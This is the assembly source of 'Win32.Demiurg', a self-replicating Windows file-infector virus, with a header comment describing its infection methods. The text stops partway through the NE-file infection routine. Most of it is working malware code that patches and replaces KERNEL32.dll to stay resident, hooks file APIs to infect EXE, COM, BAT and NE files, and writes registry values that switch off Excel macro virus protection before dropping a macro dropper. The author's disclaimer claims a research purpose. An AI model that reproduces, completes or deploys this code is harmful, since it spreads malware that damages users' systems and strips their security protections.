
; *************************************************************************
; ********************                                 ********************
; ********************          Win32.Demiurg          ********************
; ********************                by               ********************
; ********************            Black Jack           ********************
; ********************                                 ********************
; *************************************************************************

comment ~

NAME: Win32.Demiurg
AUTHOR: Black Jack [independant Austrian Win32asm virus coder]
CONTACT: Black_Jack_VX@hotmail.com | http://www.coderz.net/blackjack
TYPE: Win32 global resident (in kernel32.dll) PE/NE/MZ/COM/BAT/XLS infector
SIZE: 16354 bytes

DESCRIPTION:
The main instance of the virus is in infected PE EXE files (or the PE
dropper). If such a file is executed, the first thing the virus does is
getting the needed API addresses by standart methods (first it scans the
hosts import table for the GetModuleHandleA API and uses it to get the
KERNEL32 handle if found, if not, it gets it by the "scan down from the
value from the top of stack"-trick, then the export table of KERNEL32 is
scanned for all needed APIs, finally also ADVAPI32.dll is loaded and some
APIs for registry operations fetched from there). Then the virus performs
two tasks before returning to the host: first infected KERNEL32.dll, then
infected MS-Excel.

To infect KERNEL32.dll, it is copied from the system directory to the windows
directory and infected there. The infection process is the same as with
regular PE EXE files (see later), but not the main entry point is modified,
but some file modification APIs are hooked (to maintain compatiblity to WinNT
in both their ANSI and unicode versions). To replace the old KERNEL32.dll
with the infected copy, the virus uses the MoveFileExA API with the
MOVEFILE_DELAY_UNTIL_REBOOT flag; this will only work in WinNT, but this
doesn't matter, because Win9x will use the copy in the windows directory
rather than the one in the system directory after the next reboot anyways.

To infect Excel, the virus checks the registry if a supported version (97 or
2000) is installed; if so, it turns the macro virus protection off and gets
the path where it is installed. Then it drops a .xls file with a little macro
as \xlstart\demiurg.xls; this file will be loaded automatically at the next
start of excel, and the macro executed. Besides that, another macro source
code is generated as C:\demiurg.sys file, that contains VBA instructions to
write the virus PE dropper to C:\demiurg.exe and execute it. Please note that
this macro uses 100% VBA instructions (the binary data is stored in Arrays),
no stupid debug scripts. This file will be used to infect regular .xls files
with. This means that the VBA instance of the virus is not a "full" macro
virus, because it is not able to replicate from one .xls file to another
directly.

After the KERNEL32.dll infection, the virus will stay resident after the next
reboot. It then catches most file API functions and infects COM, EXE (MZ, NE,
PE) and BAT files as they are accessed.

The PE EXE infection process is quite standart: The last section is increased,
and the virus body is appended after the virtual end of the section. In my
opinion this is much more logical than appending after the physical end, how
it is done in most Win32 virii nowadays, because otherwise the virus body can
be overwritten by host data (if the last section is the .bss section, for
example). Besides that the virtual size is not aligned (although some
compilers/assemblers like TASM align it to SectionAlign, this is not
necessary), while the physical size is always aligned to FileAlign; this
means we can save some space in some cases. Then the entry point is set to
the virus body (in case of PE EXE files) and finally also the imagesize and
the checksum (in case it was different to zero before infection) are updated
to maintain compatiblity to WinNT; to recalculate the CRC the
CheckSumMappedFile API from IMAGEHLP.dll is used.

All other infectable files are only infected "indirectly": A small piece of
code is added that drops a PE dropper and infects it. Because of that the
virus can only replicate in Win32 enviroments, although it infects a lot of
different filetypes.

DOS EXE files are also infected in standart manner: some code is appended at
the end of file, then the entrypoint and the stack are set to it, and the
internal filesize is recalculated. Sligtly interesting is that the virus is
able to infect files with internal overlays that were generated with borland
compilers, in this case the virus is appended between the internal end of the
file and the overlay, after the overlay has been shifted back. This works
very fine (to my own surprise); try to infect TD.EXE for example.

COM files are infected by internally converting them to EXE files by
prepending a small EXE header, and then infected just like a DOS EXE file.
Of course the virus is also able to deal with ENUNS files, in this case the
ENUNS signature is threated just like an internal overlay.

BAT files are infected by adding some BAT code at the end of the file, then
the the character 1Ah (end of text file; BAT files will be only executed
until this character is reached), and after that the PE dropper. The BAT code
works by ECHOing out a small COM file (which was been written in such a
careful way that it only contains characters that are legit in BAT files) to
C:\DEMIURG.EXE. Then this file is executed with the name of the BAT file as
parameter. Then the COM file reads the PE dropper from the end of the BAT
file and writes it to C:\DEMIURG.EXE too, and then executes the new file.

NE files are infected with the method that was introduced by Mark Ludwig (I
think): The code segment that contains the entry point is increased, the rest
of the file is shifted back and the NE header tables are fixed to reflect the
new layout of the file. Then a small piece of code is injected into the newly
gained room and the entrypoint set to it; besides that the PE dropper is
appended at the end of the file as internal overlay.


ASSEMBLE WITH: 
                tasm32 /mx /m demiurg.asm
                tlink32 /Tpe /aa demiurg.obj,,, import32.lib

                there's no need for PEWRSEC or a similar tool, because the
                virus code is stored in the data section.

DISCLAIMER: I do *NOT* support the spreading of viruses in the wild.
            Therefore, this source was only written for research and
            education. Please do not spread it. The author can't be hold
            responsible for what you decide to do with this source.

~
; ===========================================================================

workspace       EQU 100000
virus_size      EQU (virus_end-start)

Extrn ExitProcess:Proc
Extrn MessageBoxA:Proc

.386
.model flat
.data
start:
	db 68h                                  ; push imm32
orig_eip  dd offset dummy_host                  ; push host entry point

	pushfd                                  ; save flags
	pushad                                  ; save all registers

	call delta                              ; get delta offset
delta:
	pop ebp
	sub ebp, offset delta

; ----- GET KERNEL32 IMAGE BASE ---------------------------------------------
	db 0B8h                                 ; mov eax, imm32
imagebase dd 400000h                            ; EAX=imagebase of host

	mov ebx, [eax+3Ch]                      ; EBX=new exe pointer RVA
	add ebx, eax                            ; EBX=new exe pointer VA
	mov ebx, [ebx+128]                      ; EBX=import directory RVA
	add ebx, eax                            ; EBX=import directory VA

search_kernel32_descriptor:
	mov esi, [ebx+12]                       ; ESI=name of library RVA
	or esi, esi                             ; last import descriptor ?
	JZ failed                               ; if yes, we failed
	add esi, eax                            ; ESI=name of library VA
	lea edi, [ebp+offset kernel32name]      ; EDI=name of kernel32 VA
	mov ecx, 8                              ; ECX=length to compare
	cld                                     ; clear direction flag
	rep cmpsb                               ; compare the two strings
	JE found_kernel32_descriptor            ; if equal, we found it

	add ebx, 20                             ; next import descriptor
	JMP search_kernel32_descriptor          ; search on

found_kernel32_descriptor:
	xor edx, edx                            ; EDX=0 - our counter
	push dword ptr [ebx+16]                 ; RVA of array of API RVAs
	mov ebx, [ebx]                          ; EBX=array of API name ptrs
	or ebx, ebx                             ; are there APIs imported ?
	JZ pop_failed                           ; if not, we failed
	add ebx, eax                            ; EBX=RVA API name ptrs array

search_GetModuleHandle:
	mov esi, [ebx]                          ; ESI=RVA of a API name
	or esi, esi                             ; searched all API names?
	JZ pop_failed                           ; if yes, we failed
	test esi, 80000000h                     ; is it an ordinal ?
	JNZ next_API                            ; can't handle ordinal imports
	add esi, eax                            ; ESI=VA of API name
	inc esi                                 ; skip the ordinal hint
	inc esi
	lea edi, [ebp+offset GetModuleHandleA]  ; EDI=VA of GetModuleHandleA
	mov ecx, l_GMH                          ; ECX=length GetModuleHandleA
	cld                                     ; clear direction flag
	rep cmpsb                               ; compare the two strings
	JE found_GetModuleHandle

next_API:
	inc edx                                 ; increment our API counter
	inc ebx                                 ; EBX=ptr to next API name ptr
	inc ebx
	inc ebx
	inc ebx
	JMP search_GetModuleHandle              ; try next API name

found_GetModuleHandle:
	pop ebx                                 ; EBX=RVA of array of API RVAs
	add ebx, eax                            ; EBX=VA of array of API RVAs
	mov ebx, [ebx+edx*4]                    ; EBX=GetModuleHandleA entry

	lea edx, [ebp+offset kernel32name]      ; EDX=pointer to KERNEL32.dll
	push edx                                ; push it
	call ebx                                ; call GetModuleHandleA
	or eax, eax                             ; got kernel32 handle/base ?
	JNZ found_kernel32                      ; if yes, we got it!
	JMP failed                              ; otherwise, try other method

pop_failed:
	pop ebx                                 ; remove shit from stack

failed:                                         ; import method failed? then
						; try memory scanning method
	
	mov ebx, [esp+10*4]                     ; EBX=address inside kernel32
kernel32find:
	cmp dword ptr [ebx], "EP"               ; found a PE header?
	JNE search_on_kernel32                  ; if not, search on
	mov eax, [ebx+34h]                      ; EAX=module base address
	or al, al                               ; is it on a page start?
	JNZ search_on_kernel32                  ; if not, search on
	cmp word ptr [eax], "ZM"                ; is there a MZ header?
	JE found_kernel32                       ; if yes, we found kernel32!
search_on_kernel32:
	dec ebx                                 ; go one byte down
	JMP kernel32find                        ; and search on
found_kernel32:
	mov [ebp+offset kernel32], eax          ; saver kernel32 base address

	
	lea esi, [ebp+offset kernel32_API_names_table]  ; get APIs from
	lea edi, [ebp+offset kernel32_API_address_table]; KERNEL32.dll
	mov ecx, number_of_kernel32_APIs
	call GetAPIs

	lea eax, [ebp+offset advapi32_dll]      ; load ADVAPI32.dll
	push eax
	call [ebp+offset LoadLibraryA]

	lea esi, [ebp+offset advapi32_API_names_table]  ; get APIs from
	lea edi, [ebp+offset advapi32_API_address_table]; ADVAPI32.dll
	mov ecx, number_of_advapi32_APIs
	call GetAPIs

	
	call infect_kernel32
	call infect_excel

	popad                                   ; restore registers
	popfd
	ret                                     ; return to host

; ----- END MAIN ROUTINE OF THE VIRUS ---------------------------------------

copyright db "[The Demiurg] - a Win32 virus by Black Jack", 0
	  db "written in Austria in the year 2000", 0

; ----- INFECT KERNEL32.DLL -------------------------------------------------
infect_kernel32:
	mov eax, [ebp+SetFileAttributesA]       ; if we're already resident, 
	sub eax, [ebp+GetFileAttributesA]       ; we know the difference
	cmp eax, 2*API_hook_size                ; between the two API entries:
	JE kernel32_infect_failure              ; so don't reinfect kernel32.

	push 260
	lea eax, [ebp+offset path_buffer1]
	push eax
	call [ebp+offset GetSystemDirectoryA]   ; get the Windows System dir

	lea eax, [ebp+offset kernel32_dll]      ; add \kernel32.dll to string
	push eax
	lea eax, [ebp+offset path_buffer1]
	push eax
	call [ebp+offset lstrcatA]

	push 260                                ; get the Windows directory
	lea eax, [ebp+offset path_buffer2]
	push eax
	call [ebp+offset GetWindowsDirectoryA]

	lea eax, [ebp+offset kernel32_dll]      ; add \kernel32.dll to string
	push eax
	lea eax, [ebp+offset path_buffer2]
	push eax
	call [ebp+offset lstrcatA]

	push 1                                  ; don't overwrite target
	lea eax, [ebp+offset path_buffer2]      ; target
	push eax
	lea eax, [ebp+offset path_buffer1]      ; source
	push eax
	call [ebp+offset CopyFileA]             ; copy kernel32.dll from
						; system to windows directory
	or eax, eax
	JZ kernel32_infect_failure

	lea edx, [ebp+offset path_buffer2]      ; open and map the KERNEL32.dll
	call openfile                           ; in the windows directory
	mov ebx, eax
	add ebx, [eax+3Ch]                      ; EBX=kernel32 PE header

	push ebx                                ; save the PE header offset
	call append_PE                          ; infect KERNEL32.dll
	pop ebx                                 ; EBX=Kernel32 PE header

	mov ecx, number_of_hooked_APIs          ; ECX=number of APIs to hook
	lea esi, [ebp+offset hooked_API_names_table] ; ESI=names of APIs
	mov edi, (API_hooks - start)            ; EDI=first API hook relative
						; to virus start

hook_APIs_loop:
	call hook_API                           ; hook this API

	mov eax, esi                            ; EAX=API name address

next_hook_API_loop:
	inc eax                                 ; search end of string
	cmp byte ptr [eax+1], 0
	JNE next_hook_API_loop

	cmp byte ptr [eax], "A"                 ; ANSI version of API?
	JNE next_API_name

	mov byte ptr [eax], "W"                 ; hook also unicode version
	push eax
	call hook_API
	pop eax
	mov byte ptr [eax], "A"                 ; restore ANSI version name

next_API_name:
	inc eax                                 ; EAX=next API name
	inc eax
	xchg esi, eax                           ; ESI=next API name

	LOOP hook_APIs_loop                     ; hook next API

finish_kernel32_infection:
	
	mov dword ptr [ebx+8], 666              ; destroy kernel32 build time

	call finish_PE_infection                ; append virus body and
						; recalculate checksum

	call closemap                           ; close map and file

	push 5                                  ; flags for MoveFileExA
						; MOVEFILE_REPLACE_EXISTING +
						; MOVEFILE_DELAY_UNTIL_REBOOT
	lea eax, [ebp+offset path_buffer1]      ; target
	push eax
	lea eax, [ebp+offset path_buffer2]      ; source
	push eax
	call [ebp+offset MoveFileExA]           ; NOTE: This API call will
						; only work in WinNT. But this
						; is no problem, because Win9X
						; will prefer the kernel32.dll
						; in the Windows directory to
						; the one in the System
						; directory anyways.
kernel32_infect_failure:
	RET


; ----- HOOK ONE API --------------------------------------------------------

hook_API:
	push ebx                                ; save registers
	push ecx
	push esi

	push ebx                                ; save EBX (PE hdr in memmap)
	push edi                                ; save EDI (hook "RVA")

	mov eax, [ebp+offset kernel32]          ; EAX=KERNEL32 base address
	call My_GetProcAddress
						; EDX=RVA of RVA of API in
						; export table
	mov ecx, [edx+eax]                      ; ECX=API RVA
	add ecx, eax                            ; ECX=API VA

	pop edi                                 ; EDI="RVA" of API hook
	pop ebx                                 ; EBX=K32 PE header in memmap
	mov [edi+ebp+offset start+1], ecx       ; store original API VA

	movzx ecx, word ptr [ebx+6]             ; ECX=number of sections
	movzx eax, word ptr [ebx+14h]           ; size of optional header
	lea ebx, [eax+ebx+18h]                  ; EBX=first section header
						; 18h = size of file header

search_section:
	mov esi, [ebx+0Ch]                      ; ESI=section RVA
	cmp esi, edx
	JA next_section
	add esi, [ebx+8]                        ; add section virtual size
	cmp esi, edx
	JA found_section
next_section:
	add ebx, 40                             ; 40 = section header size
	LOOP search_section

section_not_found:
	JMP exit_hook_API

found_section:
	sub edx, [ebx+0Ch]                      ; section RVA
	add edx, [ebx+14h]                      ; start of raw data
						; EDX=physical offset of
						; API RVA in K32 export table
	add edx, [ebp+offset mapbase]           ; EDX=address in memmap

	mov eax, edi
	add eax, [ebp+offset virus_RVA]         ; EAX=API hook RVA in K32
	mov [edx], eax                          ; hook API

exit_hook_API:
	add edi, API_hook_size                  ; EDI=next API hook
	pop esi
	pop ecx
	pop ebx
	RET


; ----- HOOKS FOR APIs ------------------------------------------------------

API_hooks:

CreateFileA_hook:
	push 12345678h
	JMP hookA

API_hook_size           EQU ($ - offset CreateFileA_hook)

CreateFileW_hook:
	push 12345678h
	JMP hookW

GetFileAttributesA_hook:
	push 12345678h
	JMP hookA

GetFileAttributesW_hook:
	push 12345678h
	JMP hookW

SetFileAttributesA_hook:
	push 12345678h
	JMP hookA

SetFileAttributesW_hook:
	push 12345678h
	JMP hookW

CopyFileA_hook:
	push 12345678h
	JMP hookA

CopyFileW_hook:
	push 12345678h
	JMP hookW

MoveFileExA_hook:
	push 12345678h
	JMP hookA

MoveFileExW_hook:
	push 12345678h
	JMP hookW

MoveFileA_hook:
	push 12345678h
	JMP hookA

MoveFileW_hook:
	push 12345678h
	JMP hookW

_lopen_hook:
	push 12345678h


hookA:
	pushf
	pusha
	call hookA_next
hookA_next:
	pop ebp
	sub ebp, offset hookA_next

	mov edi, [esp+11*4]
	call infect
	popa
	popf
	RET

hookW:
	pushf
	pusha

	call hookW_next
hookW_next:
	pop ebp
	sub ebp, offset hookW_next

	mov esi, [esp+11*4]
	lea edi, [ebp+offset path_buffer1]
        push edi

        push 0                                  ; useless default character
        push 0                                  ; useless default character
        push 260                                ; length of destination buffer
        push edi                                ; offset of destination buffer
        push -1                                 ; find length automatically
        push esi                                ; address of source buffer
        push 0                                  ; no special flags
        push 0                                  ; codepage: CP_ACP (ANSI)
	call dword ptr [ebp+WideCharToMultiByte]
        or eax, eax
        JZ WideCharToMultiByte_failed
	
        pop edi
	call infect

WideCharToMultiByte_failed:
	popa
	popf
	RET


; ----- INFECT EXCEL --------------------------------------------------------
infect_excel:

	mov [ebp+office_version_number], "8"    ; first try Excel97 (v8.0)

try_excel:
						; Open the RegKey with the
						; MS-Excel Options
	lea eax, [ebp+offset reg_handle1]       ; offset registry handle
	push eax
	push 2                                  ; access: KEY_SET_VALUE
	push 0                                  ; reserved
	lea eax, [ebp+offset regkey]            ; which regkey
	push eax
	push 80000001h                          ; HKEY_CURRENT_USER
	call [ebp+offset RegOpenKeyExA]
	or eax, eax                             ; success=>EAX=0
	JZ found_excel

	cmp [ebp+office_version_number], "9"    ; already tried both versions?
	JE failure                              ; no excel found, we failed

	inc [ebp+office_version_number]         ; try also Excel2000
	JMP try_excel


found_excel:
	cmp [ebp+office_version_number], "9"    ; which version found ?
	JE unprotect_Excel2K

unprotect_Excel97:
	lea eax, [ebp+offset reg_handle2]       ; offset registry handle
	push eax
	push 2                                  ; access: KEY_SET_VALUE
	push 0                                  ; reserved
	lea eax, [ebp+offset subkey_97]         ; which regkey
	push eax
	push dword ptr [ebp+offset reg_handle1] ; registry handle
	call [ebp+offset RegOpenKeyExA]
	or eax, eax                             ; success=>EAX=0
	JNZ failure

	mov dword ptr [ebp+offset regvalue_dword], 0  ; 0 means Macro virus
						; protection off
	lea edx, [ebp+offset regvalue_options]  ; offset value name
	JMP general_unprotect

unprotect_Excel2K:
	lea eax, [ebp+offset regvalue_dword]    ; disposition (uninteresting)
	push eax
	lea eax, [ebp+offset reg_handle2]       ; offset registry handle
	push eax
	push 0                                  ; security attributes
	push 6                                  ; access: KEY_SET_VALUE and
						; KEY_CREATE_SUB_KEY
	push 0                                  ; REG_OPTION_NON_VOLATILE
	push 0                                  ; address of class string
	push 0                                  ; reserved
	lea eax, [ebp+offset subkey_2K]         ; which regkey
	push eax
	push dword ptr [ebp+offset reg_handle1] ; registry handle
	call [ebp+RegCreateKeyExA]
	or eax, eax
	JNZ failure

	mov dword ptr [ebp+offset regvalue_dword], 1  ; 1 - lowest level of
						; macro security
	lea edx, [ebp+offset regvalue_2K]       ; offset value name

general_unprotect:
						; Now disable the MS-Excel
						; macro virus protection.
	push 4                                  ; size of buffer
	lea eax, [ebp+offset regvalue_dword]    ; address of buffer
	push eax
	push 4                                  ; REG_DWORD
	push 0                                  ; reserved
	push edx                                ; offset value name
	push [ebp+reg_handle2]                  ; reg handle
	call [ebp+offset RegSetValueExA]
	or eax, eax
	JNZ failure

	push [ebp+reg_handle2]                  ; Close the RegKey again
	call [ebp+offset RegCloseKey]
	or eax, eax
	JNZ failure

	push [ebp+reg_handle1]                  ; Close the RegKey again
	call [ebp+offset RegCloseKey]
	or eax, eax
	JNZ failure

						; Open the RegKey where we
						; will find the path to Excel
	lea eax, [ebp+offset reg_handle1]       ; offset registry handle
	push eax
	push 1                                  ; access: KEY_QUERY_VALUE
	push 0                                  ; reserved
	lea eax, [ebp+offset regkey]            ; which regkey
	push eax
	push 80000002h                          ; HKEY_LOCAL_MACHINE
	call [ebp+offset RegOpenKeyExA]
	or eax, eax                             ; success=>EAX=0
	JNZ failure

	lea eax, [ebp+offset reg_handle2]       ; offset registry handle
	push eax
	push 1                                  ; access: KEY_QUERY_VALUE
	push 0                                  ; reserved
	lea eax, [ebp+offset subkey_InstallRoot]; which regkey
	push eax
	push dword ptr [ebp+offset reg_handle1] ; reg handle
	call [ebp+offset RegOpenKeyExA]
	or eax, eax                             ; success=>EAX=0
	JNZ failure

						; Get the path where MS-Excel
						; is installed
	lea eax, [ebp+offset size_buffer]       ; address of data buffer size
        mov dword ptr [eax], 260                ; set size of data buffer
	push eax
	lea eax, [ebp+offset path_buffer1]      ; address of data buffer
	push eax
	lea eax, [ebp+offset REG_SZ]            ; address of buffer for value
	push eax                                ; type (ASCIIZ string)
	push 0                                  ; reserved
	lea eax, [ebp+offset regvalue_path]     ; address of name of value
	push eax                                ; to query
	push [ebp+reg_handle2]                  ; handle of RegKey to query
	call [ebp+offset RegQueryValueExA]
	or eax, eax
	JNZ failure

	push [ebp+reg_handle1]                  ; close the RegKey
	call [ebp+offset RegCloseKey]
	or eax, eax
	JNZ failure

	push [ebp+reg_handle2]                  ; close the RegKey
	call [ebp+offset RegCloseKey]
	or eax, eax
	JNZ failure


	lea eax, [ebp+offset demiurg_xls]       ; add "\xlstart\demiurg.xls"
	push eax                                ; (our macro dropper file)
	lea eax, [ebp+offset path_buffer1]      ; to the Excel path
	push eax
	call [ebp+offset lstrcatA]

	lea edx, [ebp+offset path_buffer1]      ; create this file
	call createfile
	JC failure

	lea esi, [ebp+offset macro_dropper]     ; decompress our macro dropper
	mov edi, eax                            ; file to the filemap
	mov ebx, macro_dropper_size
	call decompress

	mov dword ptr [ebp+filesize], 16384     ; filesize of macro dropper

	call closemap                           ; close the macro dropper file


	push dropper_size                       ; allocate memory where we can
	push 0                                  ; create the PE virus dropper
	call [ebp+offset GlobalAlloc]
	or eax, eax
	JZ failure
	mov [ebp+heap_buffer], eax              ; save memory base address

	xchg edi, eax                           ; EDI=address of allocated mem
	call create_dropper

	lea edx, [ebp+offset macro_filename]    ; create the file for the
	call createfile                         ; macro dropper code source
	JC failure                              ; that will be used to infect
						; excel files

	xchg edi, eax                           ; EDI=base of memmap
	lea esi, [ebp+offset main_macro_code]   ; copy main VBA code to there
	mov ecx, main_macro_code_size
	cld
	rep movsb

	mov byte ptr [ebp+sub_name], "b"        ; name of the first VBA sub

	mov esi, [ebp+heap_buffer]              ; ESI=PE dropper image in mem

	mov ecx, (dropper_size / 128)           ; ECX=number of a=Array(...)
						; lines that are left


build_subs_loop:
	push esi                                ; save ESI

	lea esi, [ebp+offset sub_header]        ; copy "Sub b()"
	movsd                                   ; move 9 bytes
	movsd
	movsb

	pop esi                                 ; restore ESI

	mov eax, (((dropper_size / 128)+5)/6)   ; number of lines in one sub
	cmp ecx, eax                            ; last sub?
	JB push_0                               ; ECX=0 afterwards (no more
						; lines left)
	sub ecx, eax                            ; otherwise ECX=number of
						; lines left
	push ecx                                ; save it
	mov ecx, eax                            ; ECX=nr. of lines in one sub
	JMP build_lines_loop

push_0:
	push 0

build_lines_loop:
	push ecx                                ; save number of lines left

	mov eax, "rA=a"                         ; add string "a=Array("
	stosd
	mov eax, "(yar"
	stosd

	mov ecx, 128                            ; ECX=numbers in one line

build_nubers_loop:
	push ecx                                ; save ECX

	xor eax, eax                            ; EAX=0
	lodsb                                   ; AL=one byte from dropper
	mov ecx, 3                              ; ECX=3 (nuber of digits)

number_loop_head:
	xor edx, edx                            ; EDX=0 (high dword for div)
	mov ebx, 10                             ; EBX=10
	div ebx                                 ; EDX=mod, EAX=div
	add dl, '0'                             ; DL=one digit
	push edx                                ; save it
	LOOP number_loop_head

	pop eax                                 ; AL=one digit
	stosb                                   ; store it
	pop eax                                 ; AL=next digit
	stosb
	pop eax
	stosb
	mov al, ','                             ; store a comma
	stosb

	pop ecx                                 ; ECX=number of bytes left
	LOOP build_nubers_loop

	dec edi

	mov eax, ")" + 0A0D00h + "w"*1000000h   ; add ")CRLFwCRLF"
	stosd
	mov ax, 0A0Dh
	stosw

	pop ecx                                 ; restore number of lines left
	LOOP build_lines_loop

	push esi                                ; save ESI        

	lea esi, [ebp+offset end_sub]           ; store an "end sub"
	movsd                                   ; move 9 bytes
	movsd
	movsb

	pop esi                                 ; restore ESI

	inc byte ptr [ebp+sub_name]             ; new name for next sub

	pop ecx                                 ; ECX=number of lines left
	or ecx, ecx
	JNZ build_subs_loop


	sub edi, [ebp+mapbase]                  ; EDI=size of VBA code
	mov [ebp+filesize], edi                 ; save it as filesize

	call closemap                           ; close the map/file

	push [ebp+heap_buffer]                  ; free allocated memory
	call [ebp+GlobalFree]

failure:
	RET


; ----- INFECT FILE ---------------------------------------------------------
infect:
	push edi

	xor eax, eax                            ; EAX=0
	mov ecx, eax                            ; ECX=0
	dec ecx                                 ; ECX=0FFFFFFFFh
	cld                                     ; clear direction flag
	repne scasb                             ; search for end of filename

	mov eax, [edi-5]                        ; EAX=filename extension
	or eax, 20202020h                       ; make it lowercase

	pop edx

	cmp eax, "exe."                         ; EXE file?
	JE infect_exe_com
	cmp eax, "moc."                         ; COM file?
	JE infect_exe_com
	cmp eax, "tab."                         ; BAT file?
	JNE quit_infect_error


; ----- INFECT BAT FILE -----------------------------------------------------

infect_bat:
	call openfile                           ; open and map the victim
	JC quit_infect_error                    ; opening/mapping failed ?

	xchg edi, eax                           ; EDI=start of memmap
	add edi, [ebp + offset filesize]        ; EDI=end of file in memmap
	cmp byte ptr [edi-1], 0                 ; already infected?
	JE already_infected
	lea esi, [ebp + offset bat_virus_code]  ; ESI=BAT code to add
	mov ecx, size_bat_virus_code
	cld
	rep movsb                               ; add BAT code
	call create_dropper                     ; add PE dropper as overlay
	add dword ptr [ebp + offset filesize], (size_bat_virus_code+dropper_size)
	JMP abort_infection


; ----- INFECT A EXE OR COM FILE --------------------------------------------

infect_exe_com:
	call openfile                           ; open and map the victim
	JC quit_infect_error                    ; opening/mapping failed ?

	cmp word ptr [eax], "ZM"                ; has it a MZ header?
	JE infect_exe
	cmp word ptr [eax], "MZ"                ; has it a MZ header?
	JE infect_exe


; ----- INFECT COM FILE -----------------------------------------------------

infect_com:
	mov ecx, [ebp+offset filesize]          ; ECX=size of victim file
	mov esi, ecx
	dec esi
	add esi, [ebp+offset mapbase]           ; ESI=end of file in memmap
	mov edi, esi
	add edi, 32
	std
	rep movsb                               ; shift whole file back

	lea esi, [ebp+offset new_mz_header]     ; prepend the MZ header
	mov edi, [ebp+offset mapbase]
	mov ebx, new_mz_header_size
	call decompress

	mov eax, [ebp+offset filesize]          ; update filesize
	add eax, 32
	mov [ebp+filesize], eax
	mov ebx, [ebp+offset mapbase]

	cmp word ptr [eax+ebx-4], "SN"          ; ENUNS check
	JNE no_enun
	add word ptr [eax+ebx-2], 1234h         ; fix ENUNS shit
	org $-2                                 ; otherwise TASM will give a
	dw (((size_dos_virus_code+15+dropper_size)/16)*16); warning, dunno why
	sub eax, 7                              ; make the ENUNS an overlay
no_enun:
	xor edx, edx                            ; calculate filesize for 
	mov ecx, 512                            ; MZ header
	div ecx
	or edx, edx                             ; mod
	JZ no_page_roundup
	inc eax                                 ; div
no_page_roundup:
	mov [ebx+2], edx
	mov [ebx+4], eax
	xchg eax, ebx
						; now infect it as regular EXE

; ----- EXE FILE INFECTION --------------------------------------------------

infect_exe:
	cmp word ptr [eax+12h], "JB"            ; already infected?
	JE already_infected
	mov word ptr [eax+12h], "JB"            ; mark as infectd

	cmp word ptr [eax+18h], 40h
	JE new_exe


; ----- DOS EXE INFECTION ---------------------------------------------------

dos_exe:
	mov bx, [eax+0Eh]                       ; save relo_SS
	mov [ebp+relo_SS], bx
	mov bx, [eax+10h]                       ; save SP_start
	mov [ebp+SP_start], bx
	mov bx, [eax+14h]                       ; save IP_start
	mov [ebp+IP_start], bx
	mov bx, [eax+16h]                       ; save relo_CS
	mov [ebp+relo_CS], bx

	movzx ebx, word ptr [eax+2]             ; calculate internal filesize
	movzx ecx, word ptr [eax+4]
	or ebx, ebx
	JZ no_page_round
	dec ecx
no_page_round:
	mov eax, 512
	mul ecx
	add eax, ebx
	mov [ebp+offset dos_exe_size], eax
	cmp [ebp+offset filesize], eax          ; has it an internal overlay?
	JE no_internal_overlays

with_overlay:
	mov esi, [ebp+offset mapbase]
	cmp dword ptr [eax+esi], "VOBF"         ; internal overlay of borland?
	JE infectable_overlay
	cmp word ptr [eax+esi+3], "SN"          ; ENUNS COM file converted
						; by us before?
	JNE abort_infection

infectable_overlay:
	mov ecx, [ebp+filesize]                 ; shift internal overlay back
	mov esi, ecx
	sub ecx, eax
	dec esi
	add esi, [ebp+mapbase]
	mov edi, esi
	add edi, (((size_dos_virus_code+15+dropper_size)/16)*16)
	std
	rep movsb

no_internal_overlays:
	add dword ptr [ebp+filesize], (((size_dos_virus_code+15+dropper_size)/16)*16)
	add dword ptr [ebp+dos_exe_size], (((size_dos_virus_code+15+dropper_size)/16)*16)

	mov ebx, [ebp+mapbase]
	mov edi, eax
	add edi, ebx
	lea esi, [ebp+offset dos_virus_code]
	mov ecx, size_dos_virus_code
	cld
	rep movsb
	call create_dropper

	xor edx, edx
	mov ecx, 16
	div ecx                                 ; EDX:EAX / ECX
						; EAX=DIV, EDX=MOD

	sub ax, [ebx+08h]                       ; size of header (paragr)
						; EAX=virus segment

	mov word ptr [ebx+0Eh], ax              ; new relo_SS
	mov word ptr [ebx+10h], 6000h           ; new SP_start
	mov word ptr [ebx+14h], dx              ; new IP_start
	mov word ptr [ebx+16h], ax              ; new relo_CS

	mov eax, [ebp+dos_exe_size]
	xor edx, edx
	mov ecx, 512
	div ecx
	or edx, edx                             ; mod
	JZ no_page_roundup_
	inc eax                                 ; div
no_page_roundup_:
	mov [ebx+2], dx
	mov [ebx+4], ax

	JMP abort_infection


; ----- IT IS A NEW EXE FILE ------------------------------------------------

new_exe:
	mov ebx, [eax+3Ch]                      ; EBX=new header offset
	add ebx, eax                            ; EBX=new header in memmap

	cmp dword ptr [ebx], "EP"               ; PE file?
	JE infect_PE

	cmp word ptr [ebx], "EN"                ; NE file?
	JNE abort_infection


; ----- INFECT A NE EXE FILE ------------------------------------------------

infect_NE:
	mov edi, [ebp+offset filename_ofs]
	mov esi, edi

search_pure_filename:
	cmp byte ptr [edi], "\"
	JNE no_backslash
	mov esi, edi
no_backslash:
	cmp byte ptr [edi], 0
	JE found_end_filename
	inc edi
	JMP search_pure_filename

found_end_filename:
	inc esi
	lea edi, [ebp+offset our_filename]
	cld
	movsd
	movsd
	movsd

	xchg ebx, eax

	mov cx, [eax+32h]                       ; CX=align shift
	or cx, cx                               ; align shift zero?
	JNZ align_ok                            ; if not, it's alright
	mov cx, 9                               ; if so, use default (512 byt)
align_ok:
	or ch, ch                               ; alignment too big?
	JNZ abort_infection                     ; if so, then close
	mov [ebp+offset shift_value], cl        ; store align shift value
	mov [ebp+offset shift_value2], cl       ; store again shift value

	mov ebx, size_NE_virus_code             ; EBX=virus length
	shr ebx, cl
	inc ebx                                 ; EBX=aligned length
	shl ebx, cl

	movzx esi, word ptr [eax+24h]           ; ESI=resource table in file
	add esi, eax                            ; ESI=resource table in map
	cmp cx, [esi]                           ; file align=resource align?
	JNE abort_infection                     ; if not, then close

	inc esi                                 ; esi=1st TypeInfo
	inc esi

	mov [ebp+offset resource_table], esi    ; save start of resource table

	movzx edx, word ptr [eax+16h]           ; EDX=number of code sect.
	dec edx                                 ; count starts with one
	shl edx, 3                              ; 1 sect. header=8 bytes
	movzx ecx, word ptr [eax+22h]           ; ECX=start of segment table
	add edx, ecx                            ; EDX=segment header in file
	add edx, eax                            ; EDX=segment header of start
						; code segment in mapped mem

	movzx ecx, word ptr [edx+2]             ; ECX=segment size in file
	or ecx, ecx                             ; 64K segment?
	JZ abort_infection                      ; if so, exit
	cmp [edx+6], cx                         ; cmp with size in mem
	JNE abort_infection                     ; exit if not equal

	push word ptr [eax+14h]                 ; save old start ip
